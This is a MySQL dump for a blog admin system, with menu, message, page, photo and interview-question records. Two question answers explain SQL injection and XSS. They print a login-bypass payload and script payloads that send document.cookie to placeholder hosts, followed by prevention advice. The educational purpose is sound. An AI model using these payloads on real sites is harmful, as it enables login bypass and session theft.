INSERT INTO `b_menu` VALUES (241, '237', '/system/photo/add', '', '新增', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (242, '237', '/system/photo/update', '', '修改', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (243, '237', '/system/photo/deleteBatch', '', '批量删除', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (244, '237', '/system/photo/movePhoto', '', '移动照片', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (245, '0', '/news', 'Layout', '消息管理', 0, 5, 'el-icon-bell', 'menu', '', NULL, NULL, NULL, '/new', '1');
INSERT INTO `b_menu` VALUES (246, '47', '/system/message/passBatch', '', '批量通过', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (247, '47', '/system/message/deleteBatch', '', '批量删除', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (248, '66', '/web/comment/addComment', '', '发表评论', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (249, '0', '/album', 'Layout', '相册管理', 0, 8, 'el-icon-picture-outline', 'menu', '', NULL, NULL, NULL, '/album', '1');
INSERT INTO `b_menu` VALUES (250, '57', '/system/userLog/delete', '', '删除', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (251, '59', '/system/adminLog/delete', '', '删除', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (252, '61', '/system/exceptionLog/delete', '', '删除', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (253, '27', '/system/article/deleteBatch', '', '批量删除', 2, 6, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (254, '51', '/system/friend/top', '', '置顶', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (256, '245', '/feedbacks', '/news/feedback', '反馈管理', 1, 2, 'el-icon-warning-outline', 'menu', '', NULL, NULL, NULL, '/feedback', '1');
INSERT INTO `b_menu` VALUES (257, '256', '/system/feedback/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (258, '256', '/system/feedback/deleteBatch', '', '批量删除', 2, 2, NULL, 'btn', '批量删除反馈', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (260, '64', '/file/upload', '', '上传图片', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (261, '66', '/system/home/init', '', '首页各种统计信息', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (262, '27', '/system/article/pubOrShelf', '', '发布或下架文章', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (263, '164', 'onlineUser', '/listener/user/index', '在线用户', 1, 3, 'el-icon-user', 'menu', '', NULL, NULL, NULL, 'online', '1');
INSERT INTO `b_menu` VALUES (264, '263', '/system/user/kick', '', '踢人下线', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (265, '164', 'druids', '/listener/druid/index', 'druid监控', 1, 4, 'el-icon-help', 'menu', '', NULL, NULL, NULL, 'druid', '1');
INSERT INTO `b_menu` VALUES (266, '245', 'comment', '/news/comment', '评论管理', 1, 1, 'el-icon-chat-dot-round', 'menu', '', NULL, NULL, NULL, 'comments', '1');
INSERT INTO `b_menu` VALUES (267, '266', '/system/comment/list', '', '评论列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (268, '266', '/system/comment/deleteBatch', '', '批量删除评论', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (269, '164', 'cache', '/listener/cache', '缓存监控', 1, 5, 'el-icon-hot-water', 'menu', '', NULL, NULL, NULL, 'caches', '1');
INSERT INTO `b_menu` VALUES (270, '269', '/system/home/cache', '', '获取缓存监控', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (271, '27', '/system/article/top', '', '文章置顶', 2, NULL, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (272, '0', '/question', 'Layout', '面试题管理', 0, 3, 'el-icon-medal-1', 'menu', '', NULL, NULL, NULL, '', '1');
INSERT INTO `b_menu` VALUES (273, '272', '/index', '/question/index', '面试题管理', 1, 1, 'el-icon-chat-dot-round', 'menu', '', NULL, NULL, NULL, 'Question', '1');
INSERT INTO `b_menu` VALUES (274, '272', '/qCategory', '/question/qCategory', '问题分类管理', 1, 2, 'el-icon-discount', 'menu', '', NULL, NULL, NULL, 'qCategory', '1');
INSERT INTO `b_menu` VALUES (275, '273', '/system/question/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (276, '273', '/system/question/delete', '', '删除', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (277, '273', '/system/question/update', '', '修改', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (278, '273', '/system/question/add', '', '添加', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (279, '273', '/system/question/deleteBatch', '', '批量删除', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (280, '273', '/system/question/pubOrShelf', '', '发布或下架问题', 2, 6, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (281, '273', '/system/question/top', '', '置顶', 2, 7, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (282, '274', '/system/qCategory/list', '', '列表', 2, 1, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (283, '274', '/system/qCategory/info', '', '详情', 2, 2, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (284, '274', '/system/qCategory/add', '', '新增', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (285, '274', '/system/qCategory/update', '', '修改', 2, 4, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (286, '274', '/system/qCategory/deleteBatch', '', '批量删除', 2, 5, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (287, '274', '/system/qCategory/top', '', '置顶', 2, 6, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (288, '274', '/system/qCategory/delete', '', '删除', 2, 7, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');
INSERT INTO `b_menu` VALUES (289, '273', '/system/question/info', '', '详情', 2, 3, NULL, 'btn', '', NULL, NULL, NULL, NULL, '0');

-- ----------------------------
-- Table structure for b_message
-- ----------------------------
DROP TABLE IF EXISTS `b_message`;
CREATE TABLE `b_message`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT 'ID',
  `content` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '内容',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `nickname` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `avatar` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `ip_address` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `ip_source` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `time` tinyint(10) NULL DEFAULT NULL,
  `status` int(1) NULL DEFAULT NULL COMMENT '状态 0:审核  1：正常',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_message
-- ----------------------------
INSERT INTO `b_message` VALUES (1, '好棒', '2023-04-09 20:56:19', '游客', 'http://img.codescholar.cn/7820123778294183b0e9a38d667b4e18.png', '127.0.0.1', '内网IP|内网IP', 9, 1);
INSERT INTO `b_message` VALUES (2, '111', '2023-04-10 11:42:44', '游客', 'http://img.codescholar.cn/7820123778294183b0e9a38d667b4e18.png', '127.0.0.1', '内网IP|内网IP', 8, 1);
INSERT INTO `b_message` VALUES (3, '555', '2023-04-10 11:43:09', '游客', 'http://img.codescholar.cn/e222edee404c47cfbb13b0c23c4827b1.png', '127.0.0.1', '内网IP|内网IP', 8, 1);
INSERT INTO `b_message` VALUES (4, '厉害厉害', '2023-04-10 14:43:35', '123', 'http://img.codescholar.cn/7820123778294183b0e9a38d667b4e18.png', '127.0.0.1', '内网IP|内网IP', 8, 1);
INSERT INTO `b_message` VALUES (5, '很厉害', '2023-04-10 22:41:43', '小黄鸭', 'http://img.codescholar.cn/7820123778294183b0e9a38d667b4e18.png', '127.0.0.1', '内网IP|内网IP', 8, 1);

-- ----------------------------
-- Table structure for b_page
-- ----------------------------
DROP TABLE IF EXISTS `b_page`;
CREATE TABLE `b_page`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `page_name` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `page_label` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `page_cover` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_page
-- ----------------------------
INSERT INTO `b_page` VALUES (1, '首页', 'home', 'http://img.codescholar.cn/619a51a35a5848f789b9710b446178e7.png', '2023-04-20 10:32:36', '2022-01-18 12:46:32');
INSERT INTO `b_page` VALUES (2, '归档', 'archive', 'http://img.codescholar.cn/6f7b765ce21a48c08a7595cdccbdfcdd.jpg', '2023-04-20 10:32:36', '2022-01-18 12:46:59');
INSERT INTO `b_page` VALUES (3, '分类', 'category', 'http://img.codescholar.cn/e9db451a1ad6422ba7854c34b9010500.jpg', '2023-04-20 10:32:36', '2022-01-18 12:47:17');
INSERT INTO `b_page` VALUES (4, '标签', 'tag', 'http://img.codescholar.cn/b8508af4d6004e6a86dd9b122097110f.png', '2023-04-20 10:32:36', '2022-01-18 12:47:29');
INSERT INTO `b_page` VALUES (5, '相册', 'album', 'http://img.codescholar.cn/688f508814954c0aa159609e052be448.jpg', '2023-04-20 10:32:36', '2022-01-18 12:47:42');
INSERT INTO `b_page` VALUES (6, '友链', 'link', 'http://img.codescholar.cn/d9791ca4de474330b80146d5d22fd56d.png', '2023-04-20 10:32:36', '2022-01-18 12:47:53');
INSERT INTO `b_page` VALUES (7, '关于', 'about', 'http://img.codescholar.cn/36cbc95dc0344e32b3a695284ab461b5.png', '2023-04-20 10:32:36', '2022-01-18 12:48:04');
INSERT INTO `b_page` VALUES (8, '留言', 'message', 'http://img.codescholar.cn/79b61f28146141d8b5c9c277e416460b.png', '2023-04-20 10:32:36', '2022-01-18 12:48:15');
INSERT INTO `b_page` VALUES (9, '个人中心', 'user', 'http://img.codescholar.cn/36cbc95dc0344e32b3a695284ab461b5.png', '2023-04-20 10:32:36', '2022-01-18 12:48:23');
INSERT INTO `b_page` VALUES (10, '文章列表', 'articleList', 'http://img.codescholar.cn/36cbc95dc0344e32b3a695284ab461b5.png', '2023-04-20 15:36:19', '2022-01-18 12:48:54');
INSERT INTO `b_page` VALUES (11, '面试题', 'question', 'http://img.codescholar.cn/af9484aa52274089a5e409cb1c94e87e.jpg', '2023-04-20 15:37:36', '2023-04-14 17:54:37');

-- ----------------------------
-- Table structure for b_photo
-- ----------------------------
DROP TABLE IF EXISTS `b_photo`;
CREATE TABLE `b_photo`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `album_id` int(11) NOT NULL COMMENT '相册id',
  `name` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '照片名',
  `info` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '照片描述',
  `url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '照片地址',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '照片' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_photo
-- ----------------------------
INSERT INTO `b_photo` VALUES (1, 1, '测试图1', '测试', 'http://img.codescholar.cn/ed385c9c541c41aba6469b0cbd2efbe7.jpg', '2023-04-09 21:34:20', NULL);

-- ----------------------------
-- Table structure for b_photo_album
-- ----------------------------
DROP TABLE IF EXISTS `b_photo_album`;
CREATE TABLE `b_photo_album`  (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '主键',
  `name` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '相册名',
  `info` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '相册描述',
  `cover` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '相册封面',
  `status` int(1) NOT NULL DEFAULT 0 COMMENT '状态值 0公开 1私密',
  `create_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '相册' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_photo_album
-- ----------------------------
INSERT INTO `b_photo_album` VALUES (1, '测试', '这是一个测试相册', 'http://img.codescholar.cn/688f508814954c0aa159609e052be448.jpg', 0, '2023-04-09 21:34:01', NULL);

-- ----------------------------
-- Table structure for b_q_category
-- ----------------------------
DROP TABLE IF EXISTS `b_q_category`;
CREATE TABLE `b_q_category`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `name` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '分类名称',
  `click_volume` int(10) NULL DEFAULT 0,
  `sort` int(11) NOT NULL COMMENT '排序',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '最后更新时间',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `q_category_name`(`name`) USING BTREE COMMENT '面试题分类名称'
) ENGINE = InnoDB AUTO_INCREMENT = 26 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '面试题分类表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_q_category
-- ----------------------------
INSERT INTO `b_q_category` VALUES (1, '安全', 0, 1, '2023-04-12 17:17:37', '2023-04-12 17:17:37');
INSERT INTO `b_q_category` VALUES (2, '集合', 0, 2, '2023-04-12 17:17:37', '2023-04-13 15:32:34');
INSERT INTO `b_q_category` VALUES (3, '网络编程', 0, 3, '2023-04-12 17:17:37', '2023-04-12 17:17:37');


-- ----------------------------
-- Table structure for b_question
-- ----------------------------
DROP TABLE IF EXISTS `b_question`;
CREATE TABLE `b_question`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '主键id',
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '用户id',
  `q_category_id` bigint(20) NULL DEFAULT NULL COMMENT '分类id',
  `qu_content` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '问题内容',
  `analysis` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '答案内容 （最多两百字）',
  `analysis_md` mediumtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '答案内容md版',
  `sort` int(6) NULL DEFAULT 0 COMMENT '排序',
  `is_favorite` int(2) NOT NULL DEFAULT 0 COMMENT '是否收藏 0：不收藏 1：收藏',
  `is_publish` int(2) NOT NULL DEFAULT 0 COMMENT '是否发布 0：下架 1：发布',
  `quantity` bigint(6) NULL DEFAULT 0 COMMENT '问题阅读量',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '修改时间',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `b_question_ibfk_1`(`q_category_id`) USING BTREE,
  CONSTRAINT `b_question_ibfk_1` FOREIGN KEY (`q_category_id`) REFERENCES `b_q_category` (`id`) ON DELETE NO ACTION ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 618 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '面试题表' ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of b_question
-- ----------------------------
INSERT INTO `b_question` VALUES (1, 7, 1, '如何避免sql注入？\r\n', '<p><strong>1、概念</strong></p>\n<p>SQL 注入（SQL Injection），是 Web 开发中最常见的一种安全漏洞。</p>\n<p>可以用它来从数据库获取敏感信息、利用数据库的特性执行添加用户、导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p>\n<p><strong>2、造成 SQL 注入的原因</strong></p>\n<p>程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的 SQL 脚本，程序在接收后错误的将攻击者的输入作为 SQL 语句的一部分执行，导致原始的查询逻辑被改变，执行了攻击者精心构造的恶意 SQL 语句。</p>\n<p>如 从用户表根据用户名 ConstXiong 和密码 123 查用户信息</p>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\">select * <span class=\"hljs-keyword\">from</span> user where username = <span class=\"hljs-string\">&#x27;ConstXiong&#x27;</span> and password = <span class=\"hljs-string\">&#x27;123&#x27;</span>\n</code></div></pre>\n<p>恶意修改用户名参数 ConstXiong -&gt; ConstXiong’ or 1=1 –</p>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\">select * <span class=\"hljs-keyword\">from</span> user where username = <span class=\"hljs-string\">&#x27;ConstXiong&#x27;</span> or <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">1</span> --<span class=\"hljs-string\">&#x27; and password = &#x27;</span><span class=\"hljs-number\">123</span><span class=\"hljs-string\">&#x27;\n</span></code></div></pre>\n<p><img src=\"http://www.javanav.com/aimgs/image-20191015135807-1__20191015135814.gif\" alt=\"img\" /><img src=\"http://www.javanav.com/aimgs/image-20191015135807-2__20191015135814.gif\" alt=\"img\" /></p>\n<p>SQL 中 – 是注释标记，如果上面这个 SQL 被执行，就可以让攻击者在不知道任何用户名和密码的情况下成功登录。</p>\n<p><strong>3、预防 SQL 注入攻击的方法</strong></p>\n<ul>\n<li>严格限制 Web 应用的数据库的操作权限，给连接数据库的用户提供满足需要的最低权限，最大限度的减少注入攻击对数据库的危害</li>\n<li>校验参数的数据格式是否合法（可以使用正则或特殊字符的判断）</li>\n<li>对进入数据库的特殊字符进行转义处理，或编码转换</li>\n<li>预编译 SQL（Java 中使用 PreparedStatement），参数化查询方式，避免 SQL 拼接</li>\n<li>发布前，利用工具进行 SQL 注入检测</li>\n<li>报错信息不要包含 SQL 信息输出到 Web 页面</li>\n</ul>\n', '**1、概念**\r\n\r\nSQL 注入（SQL Injection），是 Web 开发中最常见的一种安全漏洞。\r\n\r\n可以用它来从数据库获取敏感信息、利用数据库的特性执行添加用户、导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。\r\n\r\n\r\n\r\n**2、造成 SQL 注入的原因** \r\n\r\n程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的 SQL 脚本，程序在接收后错误的将攻击者的输入作为 SQL 语句的一部分执行，导致原始的查询逻辑被改变，执行了攻击者精心构造的恶意 SQL 语句。\r\n\r\n\r\n\r\n如 从用户表根据用户名 ConstXiong 和密码 123 查用户信息\r\n\r\n```javascript\r\nselect * from user where username = \'ConstXiong\' and password = \'123\'\r\n```\r\n\r\n恶意修改用户名参数 ConstXiong -> ConstXiong\' or 1=1 --\r\n\r\n```javascript\r\nselect * from user where username = \'ConstXiong\' or 1=1 --\' and password = \'123\'\r\n```\r\n\r\n![img](http://www.javanav.com/aimgs/image-20191015135807-1__20191015135814.gif)![img](http://www.javanav.com/aimgs/image-20191015135807-2__20191015135814.gif)\r\n\r\nSQL 中 -- 是注释标记，如果上面这个 SQL 被执行，就可以让攻击者在不知道任何用户名和密码的情况下成功登录。\r\n\r\n\r\n\r\n**3、预防 SQL 注入攻击的方法**\r\n\r\n- 严格限制 Web 应用的数据库的操作权限，给连接数据库的用户提供满足需要的最低权限，最大限度的减少注入攻击对数据库的危害\r\n- 校验参数的数据格式是否合法（可以使用正则或特殊字符的判断）\r\n- 对进入数据库的特殊字符进行转义处理，或编码转换\r\n- 预编译 SQL（Java 中使用 PreparedStatement），参数化查询方式，避免 SQL 拼接\r\n- 发布前，利用工具进行 SQL 注入检测\r\n- 报错信息不要包含 SQL 信息输出到 Web 页面\r\n\r\n', 1, 0, 1, 1, '2023-04-13 00:48:23', '2023-04-13 00:48:22');
INSERT INTO `b_question` VALUES (2, 7, 1, '什么是XSS攻击，如何避免？\r\n', '<hr />\n<p><strong>XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。</strong></p>\n<p><strong>原理</strong></p>\n<p>攻击者往 web 页面里插入恶意的 HTML 代码（Javascript、css、html 标签等），当用户浏览该页面时，嵌入其中的  HTML 代码会被执行，从而达到恶意攻击用户的目的。如盗取用户 cookie 执行一系列操作，破坏页面结构、重定向到其他网站等。</p>\n<p><strong>种类</strong></p>\n<p><strong>1、DOM Based XSS：基于网页 DOM 结构的攻击</strong></p>\n<p>例如：</p>\n<ul>\n<li>input 标签 value 属性赋值</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\"><span class=\"hljs-comment\">//jsp</span>\n&lt;input type=<span class=\"hljs-string\">&quot;text&quot;</span> value=<span class=\"hljs-string\">&quot;&lt;%= getParameter(&quot;</span>content<span class=\"hljs-string\">&quot;) %&gt;&quot;</span>&gt;\n</code></div></pre>\n<p>访问</p>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\"><span class=\"hljs-attr\">http</span>:<span class=\"hljs-comment\">//xxx.xxx.xxx/search?content=&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;    //弹出 XSS 字样</span>\n<span class=\"hljs-attr\">http</span>:<span class=\"hljs-comment\">//xxx.xxx.xxx/search?content=&lt;script&gt;window.open(&quot;xxx.aaa.xxx?param=&quot;+document.cookie)&lt;/script&gt;    //把当前页面的 cookie 发送到 xxxx.aaa.xxx 网站</span>\n</code></div></pre>\n<ul>\n<li>利用 a 标签的 href 属性的赋值</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\"><span class=\"hljs-comment\">//jsp</span>\n&lt;a href=<span class=\"hljs-string\">&quot;escape(&lt;%= getParameter(&quot;</span>newUrl<span class=\"hljs-string\">&quot;) %&gt;)&quot;</span>&gt;跳转...&lt;/a&gt;\n</code></div></pre>\n<p>访问</p>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\"><span class=\"hljs-attr\">http</span>:<span class=\"hljs-comment\">//xxx.xxx.xxx?newUrl=javascript:alert(&#x27;XSS&#x27;)    //点击 a 标签就会弹出 XSS 字样</span>\n变换大小写\n<span class=\"hljs-attr\">http</span>:<span class=\"hljs-comment\">//xxx.xxx.xxx?newUrl=JAvaScript:alert(&#x27;XSS&#x27;)    //点击 a 标签就会弹出 XSS 字样</span>\n加空格\n<span class=\"hljs-attr\">http</span>:<span class=\"hljs-comment\">//xxx.xxx.xxx?newUrl= JavaScript :alert(&#x27;XSS&#x27;)    //点击 a 标签就会弹出 XSS 字样</span>\n</code></div></pre>\n<ul>\n<li>image 标签 src 属性，onload、onerror、onclick 事件中注入恶意代码</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\">&lt;img src=<span class=\"hljs-string\">&#x27;xxx.xxx&#x27;</span> onerror=<span class=\"hljs-string\">&#x27;javascript:window.open(&quot;http://aaa.xxx?param=&quot;+document.cookie)&#x27;</span> /&gt;\n</code></div></pre>\n<p><strong>2、Stored XSS：存储式XSS漏洞</strong></p>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\">&lt;form action=<span class=\"hljs-string\">&quot;save.do&quot;</span>&gt;\n	<span class=\"language-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;content&quot;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&quot;&quot;</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">form</span>&gt;</span></span>\n</code></div></pre>\n<p>输入 &lt;script&gt;window.open(“xxx.aaa.xxx?param=”+document.cookie)&lt;/script&gt;，提交<br />\n当别人访问到这个页面时，就会把页面的 cookie 提交到 xxx.aaa.xxx，攻击者就可以获取到 cookie</p>\n<p><strong>预防思路</strong></p>\n<ul>\n<li>web 页面中可由用户输入的地方，如果对输入的数据转义、过滤处理</li>\n<li>后台输出页面的时候，也需要对输出内容进行转义、过滤处理（因为攻击者可能通过其他方式把恶意脚本写入数据库）</li>\n<li>前端对 html 标签属性、css 属性赋值的地方进行校验</li>\n</ul>\n<p><strong>注意：</strong></p>\n<p>各种语言都可以找到 escapeHTML() 方法可以转义 html 字符。</p>\n<pre><div class=\"hljs\"><code class=\"lang-javascript\">&lt;script&gt;<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">open</span>(<span class=\"hljs-string\">&quot;xxx.aaa.xxx?param=&quot;</span>+<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>)&lt;/script&gt;\n转义后\n%3Cscript%3Ewindow.<span class=\"hljs-property\">open</span>%<span class=\"hljs-number\">28</span>%22xxx.<span class=\"hljs-property\">aaa</span>.<span class=\"hljs-property\">xxx</span>%3Fparam%3D%<span class=\"hljs-number\">22</span>+<span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-property\">cookie</span>%<span class=\"hljs-number\">29</span>%3C/script%3E\n</code></div></pre>\n<p>需要考虑项目中的一些要求，比如转义会加大存储。可以考虑自定义函数，部分字符转义。</p>\n<p>详细可以参考：</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/ghsau/article/details/17027893\" target=\"_blank\">XSS攻击及防御</a></li>\n<li><a href=\"https://tech.meituan.com/2018/09/27/fe-security.html\" target=\"_blank\">前端安全系列（一）：如何防止XSS攻击？</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/26177815\" target=\"_blank\">浅谈XSS攻击的那些事（附常用绕过姿势）</a></li>\n</ul>\n', '\r\n------\r\n\r\n\r\n\r\n**XSS 攻击，即跨站脚本攻击（Cross Site Scripting），它是 web 程序中常见的漏洞。** \r\n\r\n\r\n\r\n**原理**\r\n\r\n攻击者往 web 页面里插入恶意的 HTML 代码（Javascript、css、html 标签等），当用户浏览该页面时，嵌入其中的  HTML 代码会被执行，从而达到恶意攻击用户的目的。如盗取用户 cookie 执行一系列操作，破坏页面结构、重定向到其他网站等。 \r\n\r\n\r\n\r\n**种类**\r\n\r\n**1、DOM Based XSS：基于网页 DOM 结构的攻击**\r\n\r\n例如：\r\n\r\n- input 标签 value 属性赋值\r\n\r\n```javascript\r\n//jsp\r\n<input type=\"text\" value=\"<%= getParameter(\"content\") %>\">\r\n```\r\n\r\n访问\r\n\r\n```javascript\r\nhttp://xxx.xxx.xxx/search?content=<script>alert(\'XSS\');</script>    //弹出 XSS 字样\r\nhttp://xxx.xxx.xxx/search?content=<script>window.open(\"xxx.aaa.xxx?param=\"+document.cookie)</script>    //把当前页面的 cookie 发送到 xxxx.aaa.xxx 网站\r\n```\r\n\r\n\r\n\r\n- 利用 a 标签的 href 